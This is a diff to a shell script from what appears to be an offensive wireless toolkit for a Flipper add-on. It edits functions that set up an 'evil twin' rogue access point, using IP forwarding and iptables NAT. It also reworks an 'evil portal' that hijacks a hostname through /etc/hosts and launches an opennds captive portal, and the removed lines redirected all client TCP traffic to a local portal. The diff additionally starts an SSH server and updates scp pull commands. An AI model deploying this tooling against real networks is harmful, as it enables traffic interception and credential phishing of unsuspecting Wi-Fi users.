@@ -73,8 +73,8 @@ function evil_twin() {
     echo 1 > /proc/sys/net/ipv4/ip_forward
 
     # Clear any previous NAT and FORWARD rules related to the interfaces
-    iptables --table nat --delete POSTROUTING --out-interface $INET_NIC -j MASQUERADE 
-    iptables --delete FORWARD --in-interface $AP_NIC -j ACCEPT 
+    iptables --table nat --delete POSTROUTING --out-interface $INET_NIC -j MASQUERADE >/dev/null
+    iptables --delete FORWARD --in-interface $AP_NIC -j ACCEPT >/dev/null
 
     # Set up NAT and FORWARD rules
     iptables --table nat --append POSTROUTING --out-interface $INET_NIC -j MASQUERADE
@@ -82,38 +82,18 @@ function evil_twin() {
 }
 
 function evil_portal() {
+    evil_twin
+
     INET_NIC=$(cat /run/inet_nic 2>/dev/null) || { echo "Connect to WiFi first"; exit 1; }
     AP_NIC=$(cat /run/ap_nic 2>/dev/null) || { echo "Create AP first"; exit 1; }
 
-    echo 1 > /proc/sys/net/ipv4/ip_forward
-    
-    iptables -F
+    grep -q "\sstatus\.client\s*" /etc/hosts && \
+    sed -i "/\sstatus\.client\s*/c${AP_IP} status.client" /etc/hosts || \
+    echo "${AP_IP} status.client" >> /etc/hosts
 
-    # Allow an initial DNS quiery to happen
-    iptables -A FORWARD -i $AP_NIC -p tcp --dport 53 -j ACCEPT
-    iptables -A FORWARD -i $AP_NIC -p udp --dport 53 -j ACCEPT
+    sed -i "s/option gatewayinterface '.*'/option gatewayinterface '$AP_NIC'/" /etc/config/opennds
 
-    # Allow incoming DHCP requests (from clients to the router)
-    iptables -A INPUT -p udp --dport 67:68 -j ACCEPT
-
-    # Allow outgoing DHCP responses (from the router to clients)
-    iptables -A OUTPUT -p udp --sport 67:68 -j ACCEPT
-
-    # Allow forwarded DHCP traffic (if the router acts as a relay or bridge)
-    iptables -A FORWARD -p udp --dport 67:68 -j ACCEPT
-
-    # Restrict just http data to port 80 to flipper blackhat IP
-    iptables -A FORWARD -i $AP_NIC -p tcp --dport 80 -d $AP_IP -j ACCEPT
-
-    # Route TCP requests to the AP_IP portal
-    iptables -t nat -A PREROUTING -i $AP_NIC -p tcp -j DNAT --to-destination $AP_IP
-
-    kill $(pidof httpd) 2>/dev/null
-    kill $(pidof evil_portal) 2>/dev/null
-    ./usr/bin/evil_portal $EVIL_PORTAL $INET_NIC &
-
-    # This is the command to route this one IP to the net.
-    # iptables -t nat -A POSTROUTING -o $INET_NIC -s $CLIENT_IP -j MASQUERADE
+    opennds -f
 }
 
 function set_param() {
@@ -181,6 +161,7 @@ function wifi() {
 }
 
 function ssh() {
+    mkdir /var/run/dropbear 2>/dev/null
     /usr/sbin/dropbear -R
     echo "SSH Server Started"
 }
@@ -212,8 +193,8 @@ case "$subcommand" in
         print_help
         ;;
     pull)
-        scp machinehum@192.168.1.139:/home/machinehum/projects/flipper-blackhat-os/package/blackhat/src/blackhat.conf /mnt/
-        scp machinehum@192.168.1.139:/home/machinehum/projects/flipper-blackhat-os/package/blackhat/src/blackhat.sh /tmp/bh
+        scp machinehum@192.168.1.178:/home/machinehum/projects/flipper-blackhat-os/package/blackhat/src/blackhat.conf /mnt/
+        scp machinehum@192.168.1.178:/home/machinehum/projects/flipper-blackhat-os/package/blackhat/src/blackhat.sh /tmp/bh
         echo "run: mv /tmp/bh /usr/bin/bh"
         ;;
     *)
